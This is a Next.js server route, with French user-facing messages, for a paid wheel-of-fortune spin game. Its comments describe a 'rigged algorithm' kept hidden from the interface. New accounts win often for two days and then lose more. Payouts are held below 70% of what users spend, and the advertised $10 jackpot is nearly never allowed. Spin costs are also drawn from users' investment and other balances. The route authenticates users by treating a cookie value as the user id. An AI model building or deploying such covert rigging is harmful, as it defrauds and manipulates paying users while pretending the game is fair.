import { db } from '@/lib/db';
import { NextResponse } from 'next/server';
import { WHEEL_SEGMENTS, DAILY_SPINS, SPIN_COST } from '../status/route';

export const dynamic = 'force-dynamic';

function getToken(request: Request): string | null {
  const authHeader = request.headers.get('x-auth-token');
  if (authHeader) return authHeader;
  const cookieHeader = request.headers.get('cookie') || '';
  const match = cookieHeader.match(/br_token=([^;]+)/);
  if (match) return match[1];
  return null;
}

async function getUser(request: Request) {
  const token = getToken(request);
  if (!token) return null;
  return db.user.findUnique({ where: { id: token } });
}

// ==================== RIGGED ALGORITHM (HIDDEN — do NOT surface in UI) ====================
//
// Over a rolling 3-day window derived from account age:
//   Days 1-2: User wins ~55-65% of the time with SMALL amounts (feels like winning).
//   Day 3+:   Win rate drops to ~25-35% (system profits more).
//
// Total winnings MUST NEVER exceed 70% of total spent.
//   totalSpent = gameSpinsUsed * 0.20
//   Hard cap:  user.gameTotalWon < totalSpent * 0.7
//   When close to the cap → force losses.
//   When far from the cap → allow wins.
//
// Jackpot ($10) is EXTREMELY rare: only allowed when gameTotalWon < totalSpent * 0.3

function getAccountDayIndex(createdAt: Date | string): number {
  const createdMs = new Date(createdAt).getTime();
  return Math.floor((Date.now() - createdMs) / (1000 * 60 * 60 * 24));
}

function shouldWin(
  gameSpinsUsed: number,
  gameTotalWon: number,
  createdAt: Date | string,
  spinsUsedToday: number,
  winsSoFarToday: number,
): boolean {
  const totalSpent = gameSpinsUsed * SPIN_COST;

  // --- Hard profit cap: never let total won exceed 70% of total spent ---
  const profitLimit = totalSpent * 0.7;
  if (gameTotalWon >= profitLimit) {
    // Already at or above the profit limit — force loss.
    return false;
  }

  // If the next win would push us over 70%, force loss.
  // Estimate average small win as $0.20 (most common).
  if (gameTotalWon + 0.20 >= profitLimit) {
    return false;
  }

  const dayIndex = getAccountDayIndex(createdAt);

  // --- 3-day rolling window ---
  // Days 0-1 (first 2 days): good days ~55-65% win rate
  // Day 2+: bad days ~25-35% win rate
  const isGoodDay = dayIndex <= 1;
  let baseProbability = isGoodDay
    ? 0.55 + Math.random() * 0.10  // 55-65%
    : 0.25 + Math.random() * 0.10; // 25-35%

  // --- Profit proximity: as user approaches the 70% cap, reduce probability ---
  const profitRatio = totalSpent > 0 ? gameTotalWon / totalSpent : 0;
  if (profitRatio > 0.5) {
    // Within 20% of the cap: aggressively reduce
    baseProbability *= 0.3;
  } else if (profitRatio > 0.35) {
    // Getting closer: moderate reduction
    baseProbability *= 0.6;
  } else if (profitRatio > 0.2) {
    // Starting to approach: slight reduction
    baseProbability *= 0.85;
  }

  // --- Daily catch-up mechanism ---
  const targetRate = isGoodDay ? 0.60 : 0.30;
  const expectedWinsSoFar = targetRate * spinsUsedToday;
  if (spinsUsedToday > 0) {
    if (winsSoFarToday < expectedWinsSoFar - 1.0) {
      // Behind target — small boost (but still limited by profit cap above)
      baseProbability = Math.min(0.80, baseProbability + 0.10);
    } else if (winsSoFarToday > expectedWinsSoFar + 1.0) {
      // Ahead of target — trim
      baseProbability = Math.max(0.10, baseProbability - 0.10);
    }
  }

  return Math.random() < baseProbability;
}

// Pick the wheel segment index for a given outcome.
// Wins are HEAVILY biased toward small amounts ($0.10, $0.20, $0.30).
// The $10 jackpot is EXTREMELY rare: only when gameTotalWon < totalSpent * 0.3.
function pickSegment(isWin: boolean, gameTotalWon: number, gameSpinsUsed: number): number {
  if (isWin) {
    const totalSpent = gameSpinsUsed * SPIN_COST;

    // Small win segments: $0.10, $0.20, $0.30 (most common)
    const smallWinIndices = WHEEL_SEGMENTS
      .map((s, i) => (s.isWin && s.reward <= 0.30 ? i : -1))
      .filter((i) => i >= 0);

    // Medium win segments: $0.50, $0.80, $1.00
    const mediumWinIndices = WHEEL_SEGMENTS
      .map((s, i) => (s.isWin && s.reward > 0.30 && s.reward < 10 ? i : -1))
      .filter((i) => i >= 0);

    // Jackpot segment: $10.00
    const jackpotIndices = WHEEL_SEGMENTS
      .map((s, i) => (s.isWin && s.reward >= 10 ? i : -1))
      .filter((i) => i >= 0);

    // Jackpot: ONLY allow if totalWon is less than 30% of total spent
    const jackpotAllowed = totalSpent > 0 && gameTotalWon < totalSpent * 0.3;
    if (jackpotAllowed && jackpotIndices.length > 0 && Math.random() < 0.01) {
      // 1% chance of jackpot when allowed (extremely rare)
      return jackpotIndices[Math.floor(Math.random() * jackpotIndices.length)];
    }

    // Medium wins: 8% chance
    if (mediumWinIndices.length > 0 && Math.random() < 0.08) {
      return mediumWinIndices[Math.floor(Math.random() * mediumWinIndices.length)];
    }

    // 91%+ of wins: small amounts ($0.10, $0.20, $0.30)
    if (smallWinIndices.length > 0) {
      return smallWinIndices[Math.floor(Math.random() * smallWinIndices.length)];
    }

    // Fallback: any win segment
    const anyWinIndices = WHEEL_SEGMENTS
      .map((s, i) => (s.isWin ? i : -1))
      .filter((i) => i >= 0);
    if (anyWinIndices.length > 0) {
      return anyWinIndices[Math.floor(Math.random() * anyWinIndices.length)];
    }
  }

  // Loss: pick uniformly from "Perdu" segments
  const losingIndices = WHEEL_SEGMENTS
    .map((s, i) => (!s.isWin ? i : -1))
    .filter((i) => i >= 0);
  return losingIndices[Math.floor(Math.random() * losingIndices.length)];
}

export async function POST(request: Request) {
  try {
    const user = await getUser(request);
    if (!user) {
      return NextResponse.json({ success: false, error: 'Non authentifié' }, { status: 401 });
    }

    const today = new Date().toISOString().slice(0, 10);

    // Reset if date changed
    let spinsUsed = user.gameSpinsUsed;
    if (user.gameSpinsDate !== today) {
      spinsUsed = 0;
    }

    // Daily limit: 10 spins, resets next day
    if (spinsUsed >= DAILY_SPINS) {
      return NextResponse.json({
        success: false,
        dailyLimitReached: true,
        error: 'Limite quotidienne atteinte (10 tours). Revenez demain !',
      }, { status: 400 });
    }

    // ---- Deduct the $0.20 spin cost ----
    // Order: balance (principal/jeu) → investBalance → videoBalance → projectBalance
    // If ALL are zero, return error.
    const bal = Math.max(0, user.balance);
    const inv = Math.max(0, user.investBalance);
    const vid = Math.max(0, user.videoBalance);
    const prj = Math.max(0, user.projectBalance);

    let remaining = SPIN_COST;
    let fromBalance = 0;
    let fromInvest = 0;
    let fromVideo = 0;
    let fromProject = 0;

    // 1) Principal balance (jeu)
    if (remaining > 0 && bal > 0) {
      fromBalance = Math.min(bal, remaining);
      remaining -= fromBalance;
    }
    // 2) Invest balance
    if (remaining > 0 && inv > 0) {
      fromInvest = Math.min(inv, remaining);
      remaining -= fromInvest;
    }
    // 3) Video balance
    if (remaining > 0 && vid > 0) {
      fromVideo = Math.min(vid, remaining);
      remaining -= fromVideo;
    }
    // 4) Project balance
    if (remaining > 0 && prj > 0) {
      fromProject = Math.min(prj, remaining);
      remaining -= fromProject;
    }

    if (remaining > 0) {
      // Not enough across all accounts
      return NextResponse.json({
        success: false,
        insufficientBalance: true,
        error: 'Veuillez effectuer un dépôt sur votre compte Jeu pour continuer à jouer.',
      }, { status: 400 });
    }

    // Count wins today from gameSpins
    const todaySpins = await db.gameSpin.findMany({
      where: { userId: user.id, spinDate: today },
    });
    const winsSoFar = todaySpins.filter((s) => s.result === 'win').length;

    // Use cumulative gameSpinsUsed (across all days) for the rigged algorithm,
    // plus gameTotalWon which also persists across days.
    const cumulativeSpinsUsed = user.gameSpinsDate === today ? user.gameSpinsUsed : 0;
    const isWin = shouldWin(cumulativeSpinsUsed, user.gameTotalWon, user.createdAt, spinsUsed, winsSoFar);
    const segmentIdx = pickSegment(isWin, user.gameTotalWon, cumulativeSpinsUsed);
    const segment = WHEEL_SEGMENTS[segmentIdx];
    const winAmount = segment.reward;
    const now = new Date();

    await db.$transaction(async (tx) => {
      // 1) Record the spin
      await tx.gameSpin.create({
        data: {
          userId: user.id,
          betAmount: SPIN_COST,
          winAmount,
          result: isWin ? 'win' : 'loss',
          segmentIdx,
          spinDate: today,
        },
      });

      // 2) Build the user update with net effect on each account.
      //    - Principal balance change = winAmount (if won) - fromBalance (cost)
      //    - Other balances only decrease by their cost portion
      const balanceDelta = (isWin ? winAmount : 0) - fromBalance;
      const investDelta = -fromInvest;
      const videoDelta = -fromVideo;
      const projectDelta = -fromProject;

      const userUpdate: Record<string, unknown> = {
        gameSpinsUsed: { increment: 1 },
        gameSpinsDate: today,
        gameLastSpinAt: now,
      };
      if (balanceDelta !== 0) userUpdate.balance = { increment: balanceDelta };
      if (investDelta !== 0) userUpdate.investBalance = { increment: investDelta };
      if (videoDelta !== 0) userUpdate.videoBalance = { increment: videoDelta };
      if (projectDelta !== 0) userUpdate.projectBalance = { increment: projectDelta };
      if (isWin && winAmount > 0) {
        userUpdate.gameTotalWon = { increment: winAmount };
      }

      await tx.user.update({
        where: { id: user.id },
        data: userUpdate,
      });

      // 3) Build detail string for cost audit
      const costParts: string[] = [];
      if (fromBalance > 0) costParts.push(`${fromBalance.toFixed(2)} $ du compte Jeu`);
      if (fromInvest > 0) costParts.push(`${fromInvest.toFixed(2)} $ de l'investissement`);
      if (fromVideo > 0) costParts.push(`${fromVideo.toFixed(2)} $ du compte Vidéo`);
      if (fromProject > 0) costParts.push(`${fromProject.toFixed(2)} $ du compte Projet`);
      const costDetail = costParts.length > 1
        ? `Tour de roue (0,20 $) — ${costParts.join(' + ')}`
        : `Tour de roue (0,20 $) — ${costParts[0]}`;

      // 4) Audit transaction for the spin cost (always)
      await tx.transaction.create({
        data: {
          type: 'game_spin_cost',
          amount: -SPIN_COST,
          detail: costDetail,
          userId: user.id,
        },
      });

      // 5) Audit transaction for the win (only if won)
      if (isWin && winAmount > 0) {
        await tx.transaction.create({
          data: {
            type: 'game_win',
            amount: winAmount,
            detail: `Gain roue de la fortune: ${segment.label}`,
            userId: user.id,
          },
        });
      }
    });

    // Re-fetch user for accurate balance
    const updatedUser = await db.user.findUnique({ where: { id: user.id } });

    const newSpinsUsed = spinsUsed + 1;
    const spinsRemaining = Math.max(0, DAILY_SPINS - newSpinsUsed);
    const netResult = winAmount - SPIN_COST;

    const message = isWin
      ? `Félicitations ! Vous avez gagné $${winAmount.toFixed(2)} à la roue ! (Coût du tour: $${SPIN_COST.toFixed(2)} — gain net: $${netResult.toFixed(2)})`
      : `Vous n'avez pas gagné cette fois-ci. Coût du tour: $${SPIN_COST.toFixed(2)}. Réessayez !`;

    return NextResponse.json({
      success: true,
      segmentIdx,
      segment: { label: segment.label, reward: segment.reward, color: segment.color, isWin },
      isWin,
      winAmount,
      spinCost: SPIN_COST,
      netResult,
      spinsUsed: newSpinsUsed,
      spinsRemaining,
      newBalance: updatedUser?.balance ?? user.balance,
      message,
    });
  } catch (error) {
    return NextResponse.json({ success: false, error: String(error) }, { status: 500 });
  }
}